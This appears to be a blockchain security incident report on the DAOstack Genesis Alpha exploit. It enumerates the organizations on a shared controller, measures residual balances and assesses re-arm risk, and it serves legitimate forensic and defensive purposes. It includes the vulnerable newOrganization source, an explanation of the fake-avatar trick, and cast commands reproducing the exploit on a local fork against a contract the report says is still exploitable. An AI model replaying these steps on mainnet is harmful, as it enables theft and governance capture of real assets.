# DAOstack "Genesis Alpha" — organization enumeration on the shared UController & re-arm assessment

**Date of analysis:** 2026-10-16 (reads at Ethereum mainnet blocks ~26,201,577–26,201,684)
**Scope:** enumerate every organization ("org"/avatar) ever registered on the shared DAOstack `UController`
`0xD5bEe5D9Ae589094c51e533f35656963fdA87305`, measure current value held by each, and assess re-arm risk
after the 2026-09-26 capture of Genesis Alpha.
**Raw evidence:** `analysis/daostack_logs/` (Etherscan responses, receipts, bytecode, fork transcript).

---

## 0. TL;DR — verdict

- **Exactly three organizations have ever been registered on this UController:**
  1. **Genesis Alpha** avatar/treasury `0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0` (created 2018-06-04);
  2. **Attacker org #1** `0xd9902ea5a84a236a86a66d37b81dd1fe10c3f181` (fake avatar, created in the exploit tx 2026-09-26);
  3. **Attacker org #2** `0xa958bd4cb3541e1d0f7592dc3b827e049aa3b924` (fake avatar, created 84 s later).
- **No organization holds any live ETH or marketable tokens today.** All three avatars: **0 ETH**.
  Genesis Alpha's only residual tokens are dust/spam (≈ **$0.03 combined**, see §1.5). **Nothing > $10 sits in any org.**
- **Re-arm risk is HIGH at the contract level even though the treasury is empty:**
  - both attacker contracts `0x304a8e57…` and `0xb21c70a4…` are **still registered as schemes on the real
    Genesis Alpha avatar with full permissions `0x1f`** and today still pass authorization for
    `sendEther`, `externalTokenTransfer`, `mintTokens`, `burnReputation`, `registerScheme`,
    `upgradeController` (read-only `eth_call` proof, §1.6). Any value ever sent to the Genesis avatar
    is instantly sweepable by them;
  - **attacker #2 still holds 20,092,432.4 of 20,121,971.0 total Genesis reputation = 99.853 %**
    (attacker #1 holds 19,800 = 0.098 %). The DAO remains governance-captured;
  - `UController.newOrganization(address)` is **still permissionless and still exploitable** — proven
    end-to-end on a local fork on 2026-10-16 (§1.7): a fresh address registered a fake org over the
    real Genesis Reputation and minted real Genesis reputation.
- **No `NewOrg`-style event exists on this UController.** Organization creation emits nothing from
  `newOrganization`; it is observable as `RegisterScheme(_sender, _sender, _avatar)` plus registry state
  (§1.2). Enumeration was therefore done from the **complete 40-log history** of the UController plus
  direct registry reads.

---

## 1. Findings

### 1.1 Contract set (all sources unverified on Etherscan)

| Role | Address | Notes |
|---|---|---|
| UController (shared controller & Reputation owner) | `0xD5bEe5D9Ae589094c51e533f35656963fdA87305` | not a proxy (EIP-1967 slots zero), runtime ≈ 20,097 bytes, deployed block 5,727,359 (2018-06-04) |
| Genesis Alpha Avatar (treasury) | `0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0` | `owner()` = UController; nativeToken = GDT, nativeReputation = Reputation |
| Reputation (voting weight) | `0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9` | `owner()` = UController; emits `Mint/Burn(address,uint256)` |
| Native token "Genesis Alpha"/GDT | `0xe30a71938b743d126E977A2b3F7450484F209a34` | name "Genesis Alpha", symbol "GDT", 18 dec |
| SchemeRegistrar | `0x781f48F300f9c2f4862347537927FC9Dc48415E0` | registered scheme on Genesis |
| GenesisProtocol (voting machine) | `0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba` | registered scheme on Genesis |
| GEN token (DAOstack) | `0x543ff227f64aa17ea132bf9886cab5db55dcaddf` | name "DAOstack"/"GEN"; drained in attack #2 |

### 1.2 The "NewOrg" event — search result: **it does not exist**

- Task step 1 (topic discovery from the exploit tx and the controller): the exploit tx
  `0xcfff7b060a7fb881f4bd8d2498dbe4e09454f7afaf5328fc12b59812f6737cc1` (block **26,059,090**) has 14 logs;
  5 of them are from the UController. Their topic0 values decode (4byte.directory) as:

| topic0 | event |
|---|---|
| `0x521230fe…` | `RegisterScheme(address,address,address)` |
| `0xeb0f295d…` | `MintReputation(address,address,uint256,address)` |
| `0xc9d509ef…` | `BurnReputation(address,address,uint256,address)` |
| `0xda35e091…` | `SendEther(address,uint256,address)` |
| `0x6c6acccb…` / `0xd4c08afe…` | `UnregisterScheme(address,address,address)` / `ExternalTokenTransfer(address,address,address,uint256)` |

- The **complete** UController log history (`text block0..latest`, 40 logs — see
  `analysis/daostack_logs/ucontroller_all_p1.json`) contains only six unique topic0s, all listed above.
  **No `NewOrg(…)`, `NewOrganization(…)` or similar event is ever emitted.** This matches the verified
  sibling source (§1.3), whose `newOrganization(address)` emits no event at all.
- Org creation is therefore identified by the event `RegisterScheme(msg.sender, msg.sender, _avatar)`
  (topic1 = topic2 = caller, topic3 = new avatar) plus the registry writes described below.
- `newOrganization(address)` itself never failed silently for a *new* avatar: whenever it succeeds it
  emits that `RegisterScheme`. Scanning all 40 logs => the complete set of avatars that ever interacted
  with this controller = `7b11dfb2…`, `d9902ea5…`, `a958bd4c…` (the 2018 bootstrap contract `82c5a168…`
  appears only as a transient scheme, unregistered in 2018).

### 1.3 `newOrganization` — root cause (verified source of the same UController generation)

The UController `0xd5bee5d9` is not verified, but a **sibling deployment of the same UController
generation is fully verified**: `0xa50c298118e89e0cc465f2a1705c7579f67b6f26` (solc 0.4.24; source saved to
`analysis/daostack_logs/UController_verified_source.txt`). Its function set, event set and live behavior
match `0xd5bee5d9` exactly (all 26 dispatcher selectors recovered from `0xd5bee5d9` map 1:1 onto the
verified source's functions; bytecode is same-generation but not byte-identical: 20,053 vs 20,184 bytes
stripped of metadata). The function that was abused:

```solidity
function newOrganization(Avatar _avatar) external {                       // NO access control (permissionless)
    require(!organizations[address(_avatar)].exist);
    require(_avatar.owner() == address(this));
    require(!reputations[_avatar.nativeReputation()]);   // getter read #1 -> decoy (unregistered) -> passes
    require(!tokens[_avatar.nativeToken()]);             // getter read #1 -> decoy                 -> passes
    organizations[address(_avatar)].exist = true;
    organizations[address(_avatar)].nativeToken      = _avatar.nativeToken();       // read #2 -> REAL token
    organizations[address(_avatar)].nativeReputation = _avatar.nativeReputation();  // read #2 -> REAL reputation
    reputations[_avatar.nativeReputation()] = true;
    tokens[_avatar.nativeToken()] = true;
    organizations[address(_avatar)].schemes[msg.sender] = Scheme(bytes32(0), bytes4(0x1F)); // caller = scheme, full perms
    emit RegisterScheme(msg.sender, msg.sender, _avatar);
}
```

and `mintReputation` afterwards mints on the stored (hijacked) contract:

```solidity
function mintReputation(uint256 _amount, address _to, address _avatar)
    external onlyRegisteredScheme(_avatar) ...
{ emit MintReputation(msg.sender,_to,_amount,_avatar);
  return organizations[_avatar].nativeReputation.mint(_to, _amount); }
```

The attacker-supplied "avatar" is a **shape-shifting fake**: its `nativeToken()`/`nativeReputation()`
return throwaway decoy addresses on read #1 (so the uniqueness `require`s pass — the decoys are
unregistered) and the **victim's real GDT/Reputation on read #2** (the read that gets stored). One fake
used by attacker #1 (`0xd9902ea5…`, 722-byte runtime, copied to evidence) returns decoys only on read #1;
the one used by attacker #2 (`0xa958bd4c…`) returns the real contracts only on read #2 — both defeat the
checks. On-chain state confirms the deception: `organizations[avatar] = GDT` and
`getNativeReputation(avatar) = 0x6256…` for *both* attacker orgs; their decoys were also marked in the
boolean registries (`reputations[e7ebb837…] = true`, `tokens[a0390649…] = true`; `reputations[0x7f7d02dd…]`
/ `tokens[0x20aef079…]` = false for attacker #1's variant). The public reconstructions agree
(DeFiHackLabs PoC `src/test/2026-09/DAOstack_exp.sol`; 0xposed; ExVul — see §1.9).

**Prerequisite satisfied by both fakes:** `owner()` returns the UController (verified live; the real
Genesis avatar's `owner()` is also the UController).

### 1.4 Organization inventory (the deliverable’s core list)

Balances read 2026-10-16 on `https://ethereum-rpc.publicnode.com` (latest ≈ block 26,201,684; earlier
reads at 26,201,577). ETH = `cast balance`; token balances = `balanceOf`/`reputationOf`.

| # | Avatar (org) | ETH | Native token (GDT) | GEN | WETH | Other tokens | Created / last UController activity |
|---|---|---|---|---|---|---|---|
| 1 | `0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0` (Genesis Alpha, victim) | **0** | 0 | 0 | 0 | DIXT 20,000,000 raw units (2e-11 tokens @18 dec); yRise 0.00009; MD+ 3.1779; 2 spam tokens (all ≈ $0, §1.5) | created block 5,727,369 (2018-06-04); last activity block 26,059,097 (2026-09-26, the token drain) |
| 2 | `0xd9902ea5a84a236a86a66d37b81dd1fe10c3f181` (attacker org #1, fake avatar) | **0** | 0 | 0 | 0 | none ever (`tokentx` empty) | created & used only in block 26,059,090 (2026-09-26 03:58:23 UTC) |
| 3 | `0xa958bd4cb3541e1d0f7592dc3b827e049aa3b924` (attacker org #2, fake avatar) | **0** | 0 | 0 | 0 | none ever | created & used only in block 26,059,097 (2026-09-26 03:59:47 UTC) |

Related (non-avatar) contracts from the attacks, all **0 ETH** and empty/self-reverting:
`0x304a8e57…` (attacker #1 scheme, 4 KB), `0xb21c70a4…` (attacker #2 scheme, 151 B),
`0xa90bbd7f…` / `0xafb91317…` (attack factories), `0x7f7d02dd…` & `0x20aef079…` (attacker #1 decoys,
58-byte metadata-only code), `0xa0390649…` & `0xe7ebb837…` (attacker #2 decoys, always-revert stubs).
The UController itself holds 0 ETH.

Registry evidence (calls on the UController, reads today):

```
organizations(0x7b11dfb2…) = GDT 0xe30a7193…   getNativeReputation(0x7b11dfb2…) = 0x62562941…
organizations(0xd9902ea5…) = GDT 0xe30a7193…   getNativeReputation(0xd9902ea5…) = 0x62562941…
organizations(0xa958bd4c…) = GDT 0xe30a7193…   getNativeReputation(0xa958bd4c…) = 0x62562941…
```

### 1.5 Treasury value today (the "> $10" test): nothing

- **Genesis Alpha avatar: 0 ETH** (`cast balance 0x7b11dfb2…` → `0`). Confirmation of the task's
  "expect 0" — it was drained in two steps: 4.025 ETH (attack #1) and all GEN + WETH (attack #2).
- Residual tokens on the avatar, with current DEX value:
  - **DIXT** (`0x43e6228b…`, "DIXT.FINANCE") 20,000,000 raw units (0.00000000002 tokens @ 18 dec) —
    **no Uniswap pair exists** → untradeable, $0.
  - **yRise** (`0x6051c1354…`, "yRise.Finance") 0.00009 units — pair `0x386c9865…` reserves
    841.64 yRise / 0.70225 WETH → ≈ $0.0002.
  - **MD+** (`0xcb696c86…`, "MoonDayPlus.com") 3.1779 units — pair `0x6bc6C7B6…` reserves
    146,207.7 MD+ / 0.36487 WETH → ≈ $0.02.
  - Spam tokens (nanoeth "claim rewards", LqETH) — $0.
  - **Total ≈ $0.03 — far below $10.**
- **No other org holds anything at all** (attacker orgs and all helper contracts are empty).
- Historical treasury: 4.025 ETH at attack time (≈ $10.9 k at 2026-09-26 prices per public reports),
  plus 2,058 GEN (drained), plus 1e-7 ETH of WETH dust.

### 1.6 The two attacker schemes are STILL ARMED (read-only proof)

`isSchemeRegistered(_, 0x7b11dfb2…)` = `true` for both `0x304a8e57…` and `0xb21c70a4…`; permissions =
`0x0000001f` (all five bits: registered, register-schemes, global-constraints, **upgrade-controller**,
generic-call; source struct comment + modifiers). These are `eth_call` results made **today** with
`--from <scheme>` (no transaction, no state change) against the live chain:

| Call (simulated as `msg.sender`) | From `0x304a8e57…` | From `0xb21c70a4…` | From random address |
|---|---|---|---|
| `sendEther(0, attacker, Genesis)` | **true** | **true** | revert |
| `externalTokenTransfer(GEN, attacker, 0, Genesis)` | — | **true** | (reverts) |
| `mintTokens(0, attacker, Genesis)` | **true** | — | (reverts) |
| `burnReputation(0, attacker, Genesis)` | **true** | — | (reverts) |
| `registerScheme(0x…9999, 0, 0x1f, Genesis)` | — | **true** | (reverts) |
| `upgradeController(0x…1234, Genesis)` | — | **true** | (reverts) |

=> Any ETH or ERC-20 that ever reaches `0x7b11dfb2…` can be taken by either attacker contract
(no vote needed), and the controller relationship itself can still be replaced.

### 1.7 The exploit is still live: local-fork reproduction today (2026-10-16)

Local anvil fork of mainnet at latest state (no transaction was sent to mainnet; transcript:
`analysis/daostack_logs/fork_rearm_test.txt`). Method: copy the **byte-exact runtime** of the on-chain
fake avatar `0xd9902ea5…` to a fresh address, set its `owner()` storage slot to the UController, then act
from an unrelated funded fork account:

1. `newOrganization(0x1111…1111)` → **status 1**, emits `RegisterScheme(0x1111…, 0x1111…, caller)`; 
2. `isSchemeRegistered(caller, 0x1111…)` → **true**, permissions `0x1f`; 
3. `mintReputation(1234e18, caller, 0x1111…)` → **status 1**, and the **real Genesis Reputation
   `0x62562941…` emits `Mint(caller, 1234e18)`** — `reputationOf(caller)` 0 → 1234e18.

Conclusion: as of today, `newOrganization` can still be abused by anyone to mint reputation on — and
mint tokens against — any reputation/token that is "attached" to this controller, including the real
Genesis Alpha Reputation.

### 1.8 Attack chronology & attacker trail (short)

| When (UTC) | Block | Event |
|---|---|---|
| 2018-06-04 | 5,727,359 | UController deployed (deployer `0x73db6408abbea97c5db8a2234c4027c315094936`); org created at 5,727,369 (Genesis Alpha + GDT + Reputation; tx `0x0188ed9f…`), initial schemes at 5,727,387 |
| 2018-07-24 | 6,022,028 | **first (failed) drain attempt**: EOA `0x1bf4e7d5…` called `UController.sendEther(4.024 ETH, 0xb38698d1…, Genesis)` directly — tx `0x53f77738…` reverted (status 0x0) |
| 2026-09-26 03:33:35 | — | attacker #1 EOA `0x5cf6bf41…` funded with 0.0049875 ETH via RAILGUN (per public report) |
| 2026-09-26 03:58:23 | **26,059,090** | exploit tx `0xcfff7b06…` (contract-creation, EOA `0x5cf6bf41…`): fake org `0xd9902ea5…` registered; **20,000 rep minted** on real Genesis Reputation (200 = 1 % burned by the vote; net **19,800 held today**), attacker scheme `0x304a8e57…` registered on the real avatar (proposal + self-vote via GenesisProtocol), **4.025 ETH drained** via `sendEther` |
| 2026-09-26 03:59:47 | 26,059,097 | second tx `0x9240fa39…` (EOA `0x1cac5af9…`, separate fresh wallet, contract-creation): fake org `0xa958bd4c…` registered; **20,295,386.27 rep minted** (202,953.86 burned; net **20,092,432.41 held today = 99.853 %**), scheme `0xb21c70a4…` registered on the real avatar with 0x1f, **2,058 GEN + 1e-7 WETH drained** via `externalTokenTransfer` (≈ $1 in test value) |
| 2026-10-08 | ~26,200,000s | attacker #1 forwarded the proceeds: **4 × 1 ETH to the Tornado Cash router** `0xd90e2f925da726b50c4ed8d0fb90ad053324f31b` (txs `0xb196fdd4…`, `0xfb7fc0cf…`, `0x4e737540…`, `0x4aca021c…`); EOA balance today `0.027746 ETH` |
| 2026-10-16 | — | attacker #2 EOA balance `0.000011 ETH`; both attacker schemes still registered; rep still held (§0, §1.6) |

### 1.9 Sources

On-chain (primary): everything in this report is reproduced from the calls/logs stored in
`analysis/daostack_logs/` (Etherscan V2 API, `chainid=1`, and `https://ethereum-rpc.publicnode.com`).
Public secondary sources consulted:
- 0xposed.io, "DAOstack Genesis Alpha — Permissionless newOrganization hijacks Reputation, drains
  treasury" (2026-10-08) — attack narrative, Railgun funding, 4.025 ETH ≈ $10,861.
- SunWeb3Sec/DeFiHackLabs, `src/test/2026-09/DAOstack_exp.sol` + README entry (fork at block 26,059,089;
  includes `testNewOrganizationIsPermissionless`).
- Tozvan/ExVul incident note (2026-09-30): "the Reputation contract was owned by a shared DAOstack
  UController … newOrganization() is permissionless and trusts a caller-supplied Avatar's own
  nativeReputation()/nativeToken()".
- DAOstack arc docs for `UController.newOrganization(address)` ("create a new organization with a
  default scheme with full permissions").
- ChainSecurity "DAOstack" audit (2019-01) — component list incl. `UController.sol` (context only).

---

## 2. Exact commands used (key reproductions)

All Ethereum reads via the public RPC `https://ethereum-rpc.publicnode.com` (no key). Etherscan V2
examples use `apikey=$ETHERSCANV2_API_KEY` sourced from the environment (never printed; never stored).

```bash
# --- 1. exploit tx receipt / internal trace (Etherscan V2) ---
TX=0xcfff7b060a7fb881f4bd8d2498dbe4e09454f7afaf5328fc12b59812f6737cc1
curl -s "https://api.etherscan.io/v2/api?chainid=1&module=proxy&action=eth_getTransactionReceipt&txhash=$TX&apikey=$ETHERSCANV2_API_KEY"   # -> exploit_receipt.json (14 logs)
curl -s "https://api.etherscan.io/v2/api?chainid=1&module=account&action=txlistinternal&txhash=$TX&apikey=$ETHERSCANV2_API_KEY"           # -> exploit_internal.json

# --- 2. full UController log history (40 logs; the org enumeration set) ---
curl -s "https://api.etherscan.io/v2/api?chainid=1&module=logs&action=getLogs&address=0xD5bEe5D9Ae589094c51e533f35656963fdA87305&fromBlock=0&toBlock=latest&page=1&offset=1000&apikey=$ETHERSCANV2_API_KEY"  # -> ucontroller_all_p1.json
jq -r '.result[].topics[0]' ucontroller_all_p1.json | sort | uniq -c        # 6 unique topics; NO NewOrg event

# --- 3. topic / selector identification ---
cast keccak "RegisterScheme(address,address,address)"                        # matches 0x521230fe…
curl -s "https://www.4byte.directory/api/v1/event-signatures/?hex_signature=0xda35e091786fbaaace32084910404a0e3a14f22a7645a4c3d0fec2c6731e3c34"
cast code 0xD5bEe5D9Ae589094c51e533f35656963fdA87305 | head -c 3000 | grep -oE '63[0-9a-f]{8}'   # dispatcher selectors
# (newOrganization(address) = 0xb9981364 confirmed in bytecode of UController and both attack contracts)

# --- 4. avatar / org state ---
cast call 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0 "nativeToken()(address)"
cast call 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0 "nativeReputation()(address)"
cast call 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0 "owner()(address)"      # = UController
cast balance 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0 --rpc-url https://ethereum-rpc.publicnode.com   # 0
for a in 0xd9902ea5a84a236a86a66d37b81dd1fe10c3f181 0xa958bd4cb3541e1d0f7592dc3b827e049aa3b924; do
  cast call $a "nativeToken()(address)"; cast call $a "nativeReputation()(address)"; cast balance $a; done
cast call 0xD5bEe5D9Ae589094c51e533f35656963fdA87305 "isSchemeRegistered(address,address)(bool)" 0x304a8e57b7a84ab1c66bc6216f0634c23eeb3f18 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0   # true
cast call 0xD5bEe5D9Ae589094c51e533f35656963fdA87305 "getSchemePermissions(address,address)(bytes4)" 0x304a8e57b7a84ab1c66bc6216f0634c23eeb3f18 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0  # 0x0000001f
cast call 0xD5bEe5D9Ae589094c51e533f35656963fdA87305 "getNativeReputation(address)(address)" 0xa958bd4cb3541e1d0f7592dc3b827e049aa3b924   # 0x62562941…

# --- 5. reputation state ---
R=0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
cast call $R "totalSupply()(uint256)"                                        # 20121971035793300000000000
cast call $R "reputationOf(address)(uint256)" 0x304a8e57b7a84ab1c66bc6216f0634c23eeb3f18  # 19800e18 (still held)
cast call $R "reputationOf(address)(uint256)" 0xb21c70a45c72c631bdd0fe9c3e9a8102684c347f  # 20092432408656300000000000 (99.853%)
cast call $R "owner()(address)"                                              # 0xD5bEe5D9… (UController)

# --- 6. re-arm probes (read-only eth_call, 2026-10-16) ---
U=0xD5bEe5D9Ae589094c51e533f35656963fdA87305
cast call $U "sendEther(uint256,address,address)" 0 0x304a8e57b7a84ab1c66bc6216f0634c23eeb3f18 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0 --from 0x304a8e57b7a84ab1c66bc6216f0634c23eeb3f18   # 0x…01 (true)
cast call $U "sendEther(uint256,address,address)" 0 0x1111111111111111111111111111111111111111 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0 --from 0x0000000000000000000000000000000000001234   # reverted (control)
cast call $U "upgradeController(address,address)" 0x0000000000000000000000000000000000001234 0x7b11dFb29504abc8C0DFA60DC7E0Aa2AAe836DB0 --from 0xb21c70a45c72c631bdd0fe9c3e9a8102684c347f   # true
# --- 7. proxy check ---
cast storage $U 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc   # 0x0 => not an EIP-1967 proxy
cast storage $U 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103   # 0x0

# --- 8. local-fork re-arm reproduction (anvil, fork of latest; NO mainnet tx) ---
anvil --fork-url https://ethereum-rpc.publicnode.com --port 8545
cast rpc anvil_setCode 0x1111111111111111111111111111111111111111 0x<byte-exact runtime of 0xd9902ea5…> --rpc-url http://127.0.0.1:8545
cast rpc anvil_setStorageAt 0x1111111111111111111111111111111111111111 0x0 0x000000000000000000000000d5bee5d9ae589094c51e533f35656963fda87305 --rpc-url http://127.0.0.1:8545
cast send --unlocked --from 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 $U "newOrganization(address)" 0x1111111111111111111111111111111111111111 --rpc-url http://127.0.0.1:8545   # SUCCESS, RegisterScheme emitted
cast send --unlocked --from 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 $U "mintReputation(uint256,address,address)" 1234000000000000000000 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 0x1111111111111111111111111111111111111111 --rpc-url http://127.0.0.1:8545   # SUCCESS, real Reputation Mint
```

Notes on measurement fidelity: publicnode serves recent blocks only (`--block` requests return
"Archive requests require a personal token"); pinned reads were taken at latest (blocks 26,201,577 and
26,201,684). Etherscan V2 was used for the 2018 blocks (e.g., 2018-06-04 timestamp via
`module=block&action=getblockreward&blockno=5727359`).

---

## 3. Evidence files (all under `analysis/daostack_logs/`)

| File | Content |
|---|---|
| `ucontroller_all_p1.json` | **all 40 logs ever emitted by the UController** (the enumeration source) |
| `exploit_receipt.json`, `exploit_tx.json`, `exploit_internal.json` | attack #1 receipt (14 logs), tx, internal trace |
| `receipt_second_2026.json`, `tx_second_2026.json`, `internal_second_2026.json` | attack #2 (25 logs, WETH/GEN drain) |
| `ucontroller_txlist.json`, `ucontroller_txs.txt` | UController external tx history (only 2 txs ever) |
| `ucontroller_code.hex`, `selectors_raw.txt` | UController runtime bytecode + dispatcher selectors |
| `code_*`, `82c5a168_code.hex` | runtimes of attack contracts / 2018 bootstrap contract |
| `fakeavatar_d9902ea5_runtime.hex` | byte-exact runtime of the attacker’s shape-shifting fake avatar |
| `UController_verified_source.txt` | verified source of the sibling UController deployment `0xa50c2981…` |
| `source_*.json` | Etherscan getsourcecode responses |
| `fork_rearm_test.txt` | local-fork re-arm reproduction transcript (2026-10-16) |
| `avatar_genesis_tokentx.json` | Genesis avatar token-transfer history (last 10 transfers) |

---

## 4. Caveats

- `0xd5bee5d9` is **unverified**; the root-cause source quoted in §1.3 is from its verified sibling
  `0xa50c2981` (same generation, matching selector/event set and matching live behavior). Bytecode is
  not byte-identical (20,053 vs 20,184 bytes without metadata); all behavioral claims above are
  independently backed by live reads/logs on `0xd5bee5d9` itself and by the local-fork reproduction.
- Org enumeration relies on the completeness of the UController’s 40-log history and the fact that
  every org-touching function emits `_avatar`-tagged events (verified against the source). A mapping
  cannot be enumerated directly from RPC; the 40 logs + `newOrganization`’s mandatory `RegisterScheme`
  emission make the set {Genesis, `0xd9902ea5…`, `0xa958bd4c…`} complete for this contract.
- Token "values" for DIXT/yRise/MD+ are estimated from on-chain Uniswap V2 reserves at read time; they
  are dust regardless of the exact USD price.
- The local-fork reproduction (§1.7) used anvil’s publicly-known test accounts and touched only the
  local fork — **no transaction was signed or sent on mainnet**.
